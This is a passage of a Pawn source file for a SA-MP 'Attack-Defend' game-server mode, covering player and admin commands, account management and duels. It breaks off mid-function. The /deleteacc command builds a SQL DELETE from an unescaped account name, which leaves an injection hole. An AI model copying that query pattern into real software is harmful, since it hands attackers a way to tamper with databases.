public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
	if(success == 0) { // If the command does not exist or returned 0
		new iString[140];
	    format(iString, sizeof(iString), "{FFFFFF}ERROR: "COL_PRIM"Command \"{FFFFFF}%s\" "COL_PRIM"is unknown. Available command list: {FFFFFF}/cmds, /acmds", cmdtext);
		SendClientMessage(playerid, -1, iString);
	}

	return 1;
}


CMD:updates(playerid, params[])
{
	new string[2048];

	string = "";

	strcat(string, "{00FF00}Attack-Defend v2.7 updates:\n");
    
    strcat(string, "\n{FFFFFF}- Much code optimization's been done for better performence and smoother gameplay.");
    strcat(string, "\n{FFFFFF}- Gamemode now uses server-sided health which brings out some features:-");
	strcat(string, "\n{FFFFFF}\t-Perfected fall protection.\n\t-Smoothly disabled heli-blades, falling, collision, explosions and fire.\n\t-No longer trusting the client, server handles player health which means less cheaters");
	strcat(string, "\n{FFFFFF}- Other fighting styles are made usable now with the power of /fightstyle.");
    strcat(string, "\n{FFFFFF}- Color your messages with: ^r, ^b, ^y, ^o, ^g, ^p at the beginning of your message.");
	strcat(string, "\n{FFFFFF}- AC Update allowing functions to be used without the plugin loaded.");
	strcat(string, "\n{FFFFFF}- Make sure you leave a message to your dead enemies using /deathdiss.");
	strcat(string, "\n{FFFFFF}- Fixed team win bug that could make wrong results in a round.");
	strcat(string, "\n{FFFFFF}");
	strcat(string, "\n{FFFFFF}");
	strcat(string, "\n{FFFFFF}");
	strcat(string, "\n{FFFFFF}");
	strcat(string, "\n{FFFFFF}");

	ShowPlayerDialog(playerid, DIALOG_HELPS, DIALOG_STYLE_MSGBOX,""COL_PRIM"Attack-Defend Updates", string, "OK","");
	return 1;
}


CMD:cmds(playerid, params[])
{
	new string[1200];

	string = "";
	strcat(string, "\n{FFFFFF}Use {FFFF00}! {FFFFFF}for team chat");
	strcat(string, "\n{FFFFFF}Press {FFFF00}N {FFFFFF}to request for backup in a round");
    strcat(string, "\n{FFFFFF}Press {FFFF00}H {FFFFFF}to lead your team");


	strcat(string, "\n\n"COL_PRIM"Basic commands:");
	strcat(string, "\n{FFFFFF}/help   /updates   /s(ync)   /v   /car   /spec   /specoff   /kill   /severstats (/sstats)");
	strcat(string, "\n{FFFFFF}/lobby   /switch   /afk   /back   /dance   /showagain   /lastplayed   /rounds   /getgun");

	strcat(string, "\n\n"COL_PRIM"DM commands:");
	strcat(string, "\n{FFFFFF}/dm   /vworld   /heal   /dmq   /antilag   /headshot");

	strcat(string, "\n\n"COL_PRIM"Duel commands:");
	strcat(string, "\n{FFFFFF}/duel   /yes   /no   /rq");

	strcat(string, "\n\n"COL_PRIM"Base commands:");
	strcat(string, "\n{FFFFFF}/readd   /gunmenu   /rem   /vr (/fix)   /para (/rp)   /getpara (/gp)   /knife   /vote");

	strcat(string, "\n\n"COL_PRIM"Player profile commands:");
	strcat(string, "\n{FFFFFF}/togspecs   /changename   /weather (/w)   /time (/t)   /changepass   /sound   /textdraw   /togspec(all)   /shortcuts   /style  /fightstyle");

	strcat(string, "\n\n"COL_PRIM"Chat-related commands:");
	strcat(string, "\n{FFFFFF}/pm   /r   /blockpm(all)   /nopm(all)   /cchannel   /pchannel   Use "COL_PRIM"# {FFFFFF}to talk in chat channel");

	strcat(string, "\n\n"COL_PRIM"Other commands:");
	strcat(string, "\n{FFFFFF}/admins   /credits   /view   /getpos   /serverpassword (/sp)   /settings   /freecam   /porn   /int   /checkversion   /testsound");

	ShowPlayerDialog(playerid,DIALOG_HELPS,DIALOG_STYLE_MSGBOX,""COL_PRIM"Player Commands", string, "OK","");
	return 1;
}

CMD:acmds(playerid, params[])
{
    if(Player[playerid][Level] < 1) return SendErrorMessage(playerid,"You need to be an admin to do that.");

	new string[3000];
	string = "";
	strcat(string, "{00CC00}@ {FFFFFF}for admin chat");

	strcat(string, "\n\n"COL_PRIM"Level 1:");
	strcat(string, "\n{FFFFFF}/add   /remove   /readd   /addall   /replace   /random   /randomint   /start   /war   /teamskin   /defaultskins   /rr   /givemenu");
	strcat(string, "\n{FFFFFF}/match   /select   /pause (/p)   /unpause (/u)   /balance   /swap   /setteam   /lock   /unlock   /weaponlimit   /spas   /lobbyguns");
	strcat(string, "\n{FFFFFF}/sethp   /setarmour   /healall   /hl   /armourall  /al   /teamname   /allvs   /setscore   /resetscores   /netcheck   /nolag  /fakepacket");
	strcat(string, "\n{FFFFFF}/jetpack   /teamdmg   /showspectateinfo   /resetallguns   /tr   /cr   /setafk   /move   /goto   /get   /roundtime   /cptime   /shortcuts");
	strcat(string, "\n{FFFFFF}/cc   /minfps   /maxping   /maxpacket   /giveallgun   /givegun   /giveweapon   /freeze   /unfreeze   /autobalance   /antispam");
	strcat(string, "\n{FFFFFF}/ra /rb /rt {CACACA}(random arena/base/tdm)   {FFFFFF}/maxtdmkills   /autopause   /fpscheck   /pingcheck   /plcheck");

	if(Player[playerid][Level] > 1) {
		strcat(string, "\n\n"COL_PRIM"Level 2:");
		strcat(string, "\n{FFFFFF}/mute   /unmute   /slap   /explode   /asay   /ann");
	}

	if(Player[playerid][Level] > 2) {
		strcat(string, "\n\n"COL_PRIM"Level 3:");
		strcat(string, "\n{FFFFFF}/kick   /ban   /unbanip   /ac   /end   /limit   /muteall   /unmuteall   /aka  /reloaddb");
	}

	if(Player[playerid][Level] > 3) {
		strcat(string, "\n\n"COL_PRIM"Level 4:");
		strcat(string, "\n{FFFFFF}/acar   /banip   /mainspawn   /clearadmcmd");
	}

	if(Player[playerid][Level] > 4) {
		strcat(string, "\n\n"COL_PRIM"Level 5:");
		strcat(string, "\n{FFFFFF}/setlevel   /config   /base   /website   /themes   /deleteacc   /setacclevel   /permac   /permlock  ");
	}

	ShowPlayerDialog(playerid,DIALOG_HELPS,DIALOG_STYLE_MSGBOX,""COL_PRIM"Admin Commands", string, "OK","");
	return 1;
}

CMD:togspec(playerid, params[])
{
	return cmd_togspecs(playerid, params);
}

CMD:togspecs(playerid, params[])
{
	if(Player[playerid][ShowSpecs])
	{
	    Player[playerid][ShowSpecs] = false;
	    PlayerTextDrawHide(playerid, WhoSpec[0]);
		PlayerTextDrawHide(playerid, WhoSpec[1]);
		SendClientMessage(playerid, -1, "{FFFFFF}Spectators textdraw "COL_PRIM"is now hidden!");
	}
	else
	{
	    Player[playerid][ShowSpecs] = true;
	    PlayerTextDrawShow(playerid, WhoSpec[0]);
		PlayerTextDrawShow(playerid, WhoSpec[1]);
		SendClientMessage(playerid, -1, "{FFFFFF}Spectators textdraw "COL_PRIM"is now shown!");
	}
	new iString[128];
	
	format(iString, sizeof(iString), "UPDATE Players SET ShowSpecs = %d WHERE Name = '%s'", (Player[playerid][ShowSpecs] == true ? 1 : 0), DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));
	return 1;
}

CMD:clearadmcmd(playerid, params[])
{
    if(Player[playerid][Level] < 4) return SendErrorMessage(playerid,"You must be level 4 to use this command.");
    ClearAdminCommandLog();
    SendClientMessage(playerid, -1, "Admin command log has been successfully cleared!");
	return 1;
}

CMD:deleteacc(playerid, params[])
{
	if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
	if(isnull(params)) return SendUsageMessage(playerid,"/deleteacc [Account Name]");

    new str[MAX_PLAYER_NAME];
 	if(sscanf(params, "s", str)) return SendUsageMessage(playerid,"/deleteacc [Account Name]");

    if(strlen(str) > MAX_PLAYER_NAME) return SendErrorMessage(playerid,"Maximum name length: 24 characters.");

    db_free_result(db_query(sqliteconnection, sprintf("DELETE FROM Players WHERE Name = '%s'", str)));
    SendClientMessage(playerid, -1, "Query executed.");
	return 1;
}

CMD:setacclevel(playerid, params[])
{
	if(Player[playerid][Level] < 5) return SendErrorMessage(playerid,"You must be level 5 to use this command.");
	if(isnull(params)) return SendUsageMessage(playerid,"/setacclevel [Account Name] [Level]");

    new str[MAX_PLAYER_NAME], lev;
	if(sscanf(params, "sd", str, lev)) return SendUsageMessage(playerid,"/setacclevel [Account Name] [Level]");

    if(lev < 0 || lev > 5) return SendErrorMessage(playerid,"Invalid level.");
    if(strlen(str) > MAX_PLAYER_NAME) return SendErrorMessage(playerid,"Maximum name length: 24 characters.");

    new iString[128];
    
	format(iString, sizeof(iString), "UPDATE Players SET Level = %d WHERE Name = '%s'", lev, DB_Escape(str));
    db_free_result(db_query(sqliteconnection, iString));
    
    SendClientMessage(playerid, -1, "Query executed.");
	return 1;
}

CMD:credits(playerid, params[])
{
	new string[512];

	string = "";
	strcat(string, "{00BBFF}Creators: {FFFFFF}062_ & Whitetiger");
	strcat(string, "\n{00BBFF}Current Developers: {FFFFFF}062_, Whitetiger, [KHK]Khalid, X.K, and Niko_boy");
	strcat(string, "\n{00BBFF}Most of textdraws by: {FFFFFF}Insanity & Niko_boy");
	strcat(string, "\n{00BBFF}Duel Arena by: {FFFFFF}Jeffy892");
	strcat(string, "\n{00BBFF}Allowed By: {FFFFFF}Deloera");
	strcat(string, "\n\n{FFFFFF}For suggestions and bug reports, visit: {00BBFF}www.sixtytiger.com");

	ShowPlayerDialog(playerid,DIALOG_HELPS,DIALOG_STYLE_MSGBOX,""COL_PRIM"Credits", string, "OK","");
	return 1;
}


CMD:settings(playerid, params[])
{
	new string[200];

	SendClientMessage(playerid, -1, ""COL_PRIM"Server settings:");
	#if ANTICHEAT == 1
	format(string, sizeof(string), "{FFFFFF}CP Time = "COL_PRIM"%d {FFFFFF}seconds | Round Time = "COL_PRIM"%d {FFFFFF}minutes | Anti-Cheat = %s", ConfigCPTime, ConfigRoundTime, (AntiCheat == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")));
	#else
	format(string, sizeof(string), "{FFFFFF}CP Time = "COL_PRIM"%d {FFFFFF}seconds | Round Time = "COL_PRIM"%d {FFFFFF}minutes", ConfigCPTime, ConfigRoundTime);
	#endif
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), "{FFFFFF}Attacker Skin = "COL_PRIM"%d {FFFFFF}| Defender Skin = "COL_PRIM"%d {FFFFFF}| Referee Skin = "COL_PRIM"%d", Skin[ATTACKER], Skin[DEFENDER], Skin[REFEREE]);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), "{FFFFFF}Min FPS = "COL_PRIM"%d {FFFFFF}| Max Ping = "COL_PRIM"%d {FFFFFF}| Max Packetloss = "COL_PRIM"%.2f", Min_FPS, Max_Ping, Float:Max_Packetloss);
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), "{FFFFFF}Auto-Balance = %s {FFFFFF}| Anti-Spam = %s", (AutoBal == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")), (AntiSpam == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")));
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), "{FFFFFF}Auto-Pause = %s {FFFFFF}| Guns in Lobby = %s {FFFFFF}| Target Player Info = %s", (AutoPause == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")), (LobbyGuns == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")), (ToggleTargetInfo == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")));
	SendClientMessage(playerid, -1, string);
	format(string, sizeof(string), "{FFFFFF}Server Anti-lag = %s {FFFFFF}| Team Chat Shortcuts = %s", (ServerAntiLag == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")), (ShortCuts == true ? ("{66FF66}Enabled") : ("{FF6666}Disabled")));
	SendClientMessage(playerid, -1, string);

	return 1;
}


CMD:getgun(playerid, params[])
{
	if(LobbyGuns == false) return SendErrorMessage(playerid,"Guns in lobby are disabled.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't use this command while playing.");
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(Player[playerid][InDM] == true) return SendErrorMessage(playerid,"Can't use this command during DM.");
	if(Player[playerid][AntiLag] == true) return SendErrorMessage(playerid,"Can't use this command in anti-lag zone.");

	new Weapon[50], Ammo, iString[128];

 	if(sscanf(params, "sd", Weapon, Ammo))  return SendUsageMessage(playerid,"/getgun [Weapon Name] [Ammo]");

	if(Ammo < 0 || Ammo > 9999) return SendErrorMessage(playerid,"Invalid Ammo.");

	new WeaponID = GetWeaponID(Weapon);
	if(WeaponID < 1 || WeaponID > 46 || WeaponID == 19 || WeaponID == 20 || WeaponID == 21 || WeaponID == 22) return SendErrorMessage(playerid,"Invalid Weapon Name.");
	if(WeaponID == 44 || WeaponID == 45) return SendErrorMessage(playerid,"We don't do this shit around here.");

	GivePlayerWeapon(playerid, WeaponID, Ammo);

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has given himself {FFFFFF}%s "COL_PRIM"with {FFFFFF}%d "COL_PRIM"ammo.", Player[playerid][Name], WeaponNames[WeaponID], Ammo);
	SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:lobbyguns(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[160];

	if(LobbyGuns == true) {
		LobbyGuns = false;
    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"guns in lobby.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

	} else {
		LobbyGuns = true;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"guns in lobby.", Player[playerid][Name]);
        SendClientMessageToAll(-1, iString);
	}
	LogAdminCommand("lobbyguns", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:autopause(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[160];

 	if(AutoPause == true) {
		AutoPause = false;
    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"Auto-Pause on player disconnect in war mode.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

	} else {
		AutoPause = true;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"Auto-Pause on player disconnect in war mode.", Player[playerid][Name]);
        SendClientMessageToAll(-1, iString);
	}
    LogAdminCommand("autopause", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:ann(playerid, params[])
{
	if(Player[playerid][Level] < 2) return SendErrorMessage(playerid,"You must be a higher level admin to use this command.");
	if(isnull(params)) return SendUsageMessage(playerid,"/ann [Text]");

    new str[128];
	if(sscanf(params, "s", str)) return SendUsageMessage(playerid,"/ann [Text]");

    if(strlen(str) > 127) return SendErrorMessage(playerid,"Text is too long. Maximum 128 characters allowed.");
    if(strfind(str, "`") != -1) return SendErrorMessage(playerid,"` is not allowed.");
	if(!IsSafeGametext(str))
	{
	    SendErrorMessage(playerid, "You're probably missing a '~' which can crash you and/or other clients!");
        SendClientMessage(playerid, -1, "{FFFFFF}Note: "COL_PRIM"Always leave a space between a '~' and the character 'K'");
		return 1;
	}

	KillTimer(AnnTimer);

	TextDrawSetString(AnnTD, str);
	TextDrawShowForAll(AnnTD);
	AnnTimer = SetTimer("HideAnnForAll", 5000, false);

	format(str, sizeof(str), "{FFFFFF}%s "COL_PRIM"made an announcement.", Player[playerid][Name]);
	SendClientMessageToAll(-1, str);
    LogAdminCommand("ann", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:freecam(playerid, params[])
{
	if(Player[playerid][Playing] == true) return 1;
	if(Player[playerid][InDM] == true) return 1;
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(Player[playerid][AntiLag] == true) return 1;
	if(Player[playerid][Spectating] == true) return 1;

	if(noclipdata[playerid][FlyMode] == true)
	{
		CancelFlyMode(playerid);
		PlayerTextDrawShow(playerid, RoundKillDmgTDmg);
		PlayerTextDrawShow(playerid, FPSPingPacket);
		PlayerTextDrawShow(playerid, BaseID_VS);
		TextDrawShowForPlayer(playerid, WebText);
		PlayerTextDrawShow(playerid, HPTextDraw_TD);
		PlayerTextDrawShow(playerid, ArmourTextDraw);
		ShowPlayerProgressBar(playerid, HealthBar);
		ShowPlayerProgressBar(playerid, ArmourBar);
	}
	else
	{
		PlayerFlyMode(playerid);
		SendClientMessage(playerid, -1, "Use /specoff to exit FreeCam!");
		PlayerTextDrawHide(playerid, RoundKillDmgTDmg);
		PlayerTextDrawHide(playerid, FPSPingPacket);
		PlayerTextDrawHide(playerid, BaseID_VS);
		TextDrawHideForPlayer(playerid, WebText);
		PlayerTextDrawHide(playerid, HPTextDraw_TD);
		PlayerTextDrawHide(playerid, ArmourTextDraw);
		HidePlayerProgressBar(playerid, HealthBar);
		HidePlayerProgressBar(playerid, ArmourBar);
	}
	LogAdminCommand("freecam", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:antispam(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[160];

 	if(AntiSpam == true) {
		AntiSpam = false;
    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"anti-spam.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

	} else {
		AntiSpam = true;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"anti-spam.", Player[playerid][Name]);
        SendClientMessageToAll(-1, iString);
	}
    LogAdminCommand("antispam", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:autobalance(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[160];

 	if(AutoBal == true) {
		AutoBal = false;
    	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}disabled "COL_PRIM"auto-balance in non war mode.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);

	} else {
		AutoBal = true;
	    format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has {FFFFFF}enabled "COL_PRIM"auto-balance in non war mode.", Player[playerid][Name]);
        SendClientMessageToAll(-1, iString);
	}
    LogAdminCommand("autobalance", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:givegun(playerid, params[])
{
	cmd_giveweapon(playerid, params);
	return 1;
}

CMD:fix(playerid, params[])
{
	cmd_vr(playerid, params);
	return 1;
}

CMD:setarmor(playerid, params[])
{
	cmd_setarmour(playerid, params);
	return 1;
}

CMD:armorall(playerid, params[])
{
	cmd_armourall(playerid, params);
	return 1;
}

CMD:gmx(playerid, params[])
{
	if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 5 admin to do that.");

	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s (%d) "COL_PRIM"has restarted server", Player[playerid][Name], playerid);
	SendClientMessageToAll(-1, iString);

    LogAdminCommand("gmx", playerid, INVALID_PLAYER_ID);

	SendRconCommand("gmx");
	return 1;
}


CMD:website(playerid, params[])
{
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 5 or Rcon admin to do that.");
    if(isnull(params)) return SendUsageMessage(playerid,"/website [Text] {FFFFFF}| You can use colors like {FF0000}~r~ {00FF00}~g~ {0000FF}~b~ {FFFFFF}etc.");

    new str[128];
	if(sscanf(params, "s", str)) return SendUsageMessage(playerid,"/website [Text] {FFFFFF}| You can use colors like {FF0000}~r~ {00FF00}~g~ {0000FF}~b~ {FFFFFF}etc.");

    if(strlen(str) > 127) return SendErrorMessage(playerid,"Text is too long. Maximum 128 characters allowed.");
    if(strfind(str, "`") != -1) return SendErrorMessage(playerid,"` is not allowed.");
	//if(strfind(str, "~") != -1) return SendErrorMessage(playerid,"~ not allowed.");
	if(!IsSafeGametext(str))
	{
	    SendErrorMessage(playerid, "You're probably missing a '~' which can crash you and/or other clients!");
        SendClientMessage(playerid, -1, "{FFFFFF}Note: "COL_PRIM"Always leave a space between a '~' and the character 'K'");
		return 1;
	}
	format(WebString, 128, str);

	new iString[180];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = '%s' WHERE Option = 'WebAddress'", DB_Escape(WebString));
    db_free_result(db_query(sqliteconnection, iString));

	TextDrawSetString(WebText, WebString);

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed Website text.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("website", playerid, INVALID_PLAYER_ID);
	return 1;
}


CMD:asay(playerid, params[])
{
    if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 2 admin to do that.");
	if(isnull(params)) return SendUsageMessage(playerid,"/asay [Text]");

	new iString[180];
	format(iString, sizeof(iString), "{6688FF}* Admin: %s", params);
	SendClientMessageToAll(-1, iString);

	printf("%s (%d) used /asay : %s", Player[playerid][Name], playerid, params);
    LogAdminCommand("asay", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:banip(playerid,params[])
{
	if(Player[playerid][Level] < 4 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a level 4 admin to do that.");
	if(isnull(params)) return SendUsageMessage(playerid,"/banip [IP or IP range to ban]");

	new iString[128];
	format(iString, sizeof(iString), "banip %s", params);
	SendRconCommand(iString);

	SendRconCommand("reloadbans");

	new iString2[128];
	format(iString2, sizeof(iString2), "%s%s (%d) "COL_PRIM"has banned IP: {FFFFFF}%s", TextColor[Player[playerid][Team]], Player[playerid][Name], playerid, params);
	SendClientMessageToAll(-1, iString2);
    LogAdminCommand("banip", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:spas(playerid, params[])
{
    if(Player[playerid][Level] < 1) return SendErrorMessage(playerid,"You need to be a higher level admin to do that.");

    new Params[64], string[128], iString[160], CommandID;
	sscanf(params, "s", Params);

	if(isnull(Params) || IsNumeric(Params)) return SendUsageMessage(playerid,"/spas [on | off]");

	if(strcmp(Params, "on", true) == 0) CommandID = 1;
	else if(strcmp(Params, "off", true) == 0) CommandID = 2;
	else return SendUsageMessage(playerid,"/spas [on | off]");

	switch(CommandID) {
		case 1: {
		    WeaponLimit[8] = 1;
			format(string,sizeof(string),"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",WeaponLimit[0],WeaponLimit[1],WeaponLimit[2],WeaponLimit[3],WeaponLimit[4],WeaponLimit[5],WeaponLimit[6],WeaponLimit[7],WeaponLimit[8],WeaponLimit[9]);
			format(iString, sizeof(iString), "UPDATE Configs SET Value = '%s' WHERE Option = 'Weapon Limits'", string);
			db_free_result(db_query(sqliteconnection, iString));
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}| Spas - Rifle | "COL_PRIM"limit to {FFFFFF}1", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		} case 2: {
		    WeaponLimit[8] = 0;
   			format(string,sizeof(string),"%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",WeaponLimit[0],WeaponLimit[1],WeaponLimit[2],WeaponLimit[3],WeaponLimit[4],WeaponLimit[5],WeaponLimit[6],WeaponLimit[7],WeaponLimit[8],WeaponLimit[9]);
			format(iString, sizeof(iString), "UPDATE Configs SET Value = '%s' WHERE Option = 'Weapon Limits'", string);
			db_free_result(db_query(sqliteconnection, iString));
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed {FFFFFF}| Spas - Rifle | "COL_PRIM"limit to {FFFFFF}0", Player[playerid][Name]);
			SendClientMessageToAll(-1, iString);
		}
	}
	LogAdminCommand("spas", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:lobby(playerid, params[])
{
	new iString[180];

	if(Player[playerid][InDM] == true) QuitDM(playerid);
   	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
   	
	if(Player[playerid][AntiLag] == true) {
	    Player[playerid][AntiLag] = false;

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has quit the Anti-Lag zone.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);
	}


    if(Player[playerid][Playing] == true) {
		new Float:HP[2];
		GetHP(playerid, HP[0]);
		GetAP(playerid, HP[1]);
		format(iString, sizeof(iString), "{FFFFFF}%s (%d) "COL_PRIM"has removed himself from the round. {CCCCCC}HP %.0f | Armour %.0f", Player[playerid][Name], playerid, HP[0], HP[1]);
		SendClientMessageToAll(-1, iString);
        RemovePlayerFromRound(playerid);

    }
    SpawnPlayerEx(playerid);
	return 1;
}

CMD:sstats(playerid, params[])
{
	cmd_serverstats(playerid, params);
	return 1;
}

CMD:duel(playerid, params[])
{
	new invitedid, Weapon1[50], Weapon2[50], iString[180];

 	if(sscanf(params, "iss", invitedid, Weapon1, Weapon2)) return SendUsageMessage(playerid,"/duel [Player ID] [Weapon 1] [Weapon 2]");

	if(!IsPlayerConnected(invitedid)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[invitedid][Playing] == true) return SendErrorMessage(playerid,"That player is in a round.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"You can't duel while being in a round.");
	if(Player[invitedid][InDuel] == true) return SendErrorMessage(playerid,"That player is already dueling someone.");
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"You are already dueling someone.");
	if(Player[invitedid][challengerid] == playerid) return SendErrorMessage(playerid,"You have already invited that player for duel. Let him accept or deny your previous invite.");    //duelspamfix
	if(invitedid == playerid) return SendErrorMessage(playerid,"Can't duel with yourself.");

	new WeaponID1 = GetWeaponID(Weapon1);
	if(WeaponID1 < 1 || WeaponID1 > 46 || WeaponID1 == 19 || WeaponID1 == 20 || WeaponID1 == 21) return SendErrorMessage(playerid,"Invalid Weapon Name.");
	if(WeaponID1 == 40 || WeaponID1 == 43 || WeaponID1 == 44 || WeaponID1 == 45) return SendErrorMessage(playerid,"That weapon is not allowed in duels.");

	new WeaponID2 = GetWeaponID(Weapon2);
	if(WeaponID2 < 1 || WeaponID2 > 46 || WeaponID2 == 19 || WeaponID2 == 20 || WeaponID2 == 21) return SendErrorMessage(playerid,"Invalid Weapon Name.");
	if(WeaponID2 == 40 || WeaponID2 == 43 || WeaponID2 == 44 || WeaponID2 == 45) return SendErrorMessage(playerid,"That weapon is not allowed in duels.");

	Player[invitedid][challengerid] = playerid;
	Player[invitedid][duelweap1] = WeaponID1;
	Player[invitedid][duelweap2] = WeaponID2;

	format(iString, sizeof(iString), "%s%s {FFFFFF}challenged %s%s {FFFFFF}to a duel with: %s and %s", TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[invitedid][Team]], Player[invitedid][Name], WeaponNames[WeaponID1], WeaponNames[WeaponID2]);
	SendClientMessageToAll(-1, iString);
	SendClientMessage(invitedid, -1, "{FF8800}Type {FFFFFF}/yes {FF8800}to accept the duel challenge or {FFFFFF}/no {FF8800}to deny the duel challenge.");
    PlayerPlaySound(invitedid,1137,0.0,0.0,0.0);

	return 1;
}

CMD:yes(playerid, params[])
{
	new pID, WeaponID1, WeaponID2, iString[180];
	pID = Player[playerid][challengerid];
	WeaponID1 = Player[playerid][duelweap1];
	WeaponID2 = Player[playerid][duelweap2];

	if(Player[playerid][challengerid] == -1) return SendErrorMessage(playerid,"No one has invited you to a duel.");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");
	if(Player[pID][Playing] == true) return SendErrorMessage(playerid,"That player is in a round.");
	if(Player[pID][InDuel] == true) return SendErrorMessage(playerid,"That player is already dueling someone else.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"You can't duel while being in a round.");

	format(iString, sizeof(iString), "%s%s {FFFFFF}accepted the duel challenge by %s%s", TextColor[Player[playerid][Team]], Player[playerid][Name], TextColor[Player[pID][Team]], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);

	if(Player[playerid][Spectating] == true) StopSpectate(playerid);
	if(Player[pID][Spectating] == true) StopSpectate(pID);
	ResetPlayerWeapons(playerid);
	ResetPlayerWeapons(pID);
	SetPlayerVirtualWorld(playerid, playerid+10);
	SetPlayerVirtualWorld(pID, playerid+10);
	SetHP(playerid, 100);
	SetHP(pID, 100);
	SetAP(playerid, 100);
	SetAP(pID, 100);


	SetSpawnInfoEx(playerid, playerid, Skin[Player[playerid][Team]], -2966.9707, 1768.2054, 12.6369, 270.0, WeaponID1, 9999, WeaponID2, 9999, 0, 0);
	SendClientMessage(playerid,-1," ");
	SendClientMessage(playerid,0xFF0000FF,"FIGHT!");
	SendClientMessage(playerid,-1," ");
	Player[playerid][IgnoreSpawn] = true;
	SpawnPlayerEx(playerid);
	SetPlayerInterior(playerid, 1);
	Player[playerid][challengerid] = pID;
	Player[playerid][InDuel] = true;
	Player[playerid][TeamBeforeDuel] = Player[playerid][Team];
	Player[playerid][Team] = REFEREE;
	SetPlayerColor(playerid, 0xFF880088);
	SetPlayerSkin(playerid, Skin[Player[playerid][Team]]);
	PlayerPlaySound(playerid,3200,0.0,0.0,0.0);
	Player[playerid][ToAddInRound] = false;

	SetSpawnInfoEx(pID, pID, Skin[Player[pID][Team]], -2888.6243, 1767.4994, 12.6369, 90.0, WeaponID1, 9999, WeaponID2, 9999, 0, 0);
	SendClientMessage(pID,-1," ");
	SendClientMessage(pID,0xFF0000FF,"FIGHT!");
	SendClientMessage(pID,-1," ");
	Player[pID][IgnoreSpawn] = true;
	SpawnPlayerEx(pID);
